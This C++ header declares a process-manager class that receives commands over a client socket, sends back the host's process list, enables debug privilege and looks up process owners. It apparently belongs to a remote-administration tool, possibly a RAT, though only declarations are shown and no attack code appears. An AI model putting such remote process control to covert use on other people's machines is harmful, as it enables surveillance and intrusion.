
#include "stdafx.h"
#include "Manager.h"
#include <TlHelp32.h>
#include <Psapi.h>
#pragma comment(lib,"Psapi.lib")
#include <Winternl.h>


#define ProcessImageFileName 27
typedef NTSTATUS (WINAPI *lpfnNtQuerySystemInformation)(   
	int   SystemInformationClass,    // 定义服务类型号
	PVOID   SystemInformation,                            // 用户存储信息的缓冲区
	ULONG   SystemInformationLength,                    // 缓冲区大小
	PULONG   ReturnLength   );                            // 返回信息长度
//typedef NTSTATUS (WINAPI *ZwQueryInformationProcessP)(HANDLE,int,PVOID,ULONG,PULONG);
typedef struct SYSTEM_PROCESS_IMAGE_NAME_INFORMATION{
	HANDLE ProcessId;
	UNICODE_STRING ImageName;
};
class CProcessManager : public CManager
{
public:
	CProcessManager(CClientSocket *pClient,UINT ID);
	~CProcessManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
public:
	UINT	m_ID;
	//memebers
private:
	//HMODULE hNtDll;
	//ZwQueryInformationProcessP m_zwQuery;
	lpfnNtQuerySystemInformation NtQuerySystemInformationX;
	BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath);
//	_RtlAdjustPrivilege pfnRtlAdjustPrivilege;
public:
	void SendProcessList();
	bool DebugPrivilege(const wchar_t *PName,BOOL bEnable);
	void GetProcessUserName(DWORD dwID,wchar_t* pusername);
};
